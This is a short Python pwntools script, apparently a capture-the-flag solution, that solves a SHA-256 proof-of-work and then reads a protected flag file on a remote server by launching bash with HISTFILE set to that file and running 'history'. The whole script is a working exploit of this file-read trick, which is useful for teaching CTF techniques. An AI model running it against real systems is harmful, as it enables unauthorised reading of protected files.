#!/usr/bin/env python
from pwn import *
import re, string, itertools
from hashlib import sha256

def proof_of_work(s):
    cand = string.letters + string.digits
    for i in itertools.product(cand, repeat = 5): 
        i = "".join(j for j in i)
        if sha256(s + i).hexdigest()[:5] == "00000":
            return s + i 

r = remote('104.199.132.199', 2222)
r.recvuntil("proof of work. ")
proof = re.findall("Send me a string starting with '([a-z]+)'", r.recv())[0]
proof = proof_of_work(proof)
r.sendline(proof)
r.sendline('cd /home/ctf/')
r.sendline('HISTFILE=flag.ray /bin/bash')
r.sendline('history')
r.interactive()
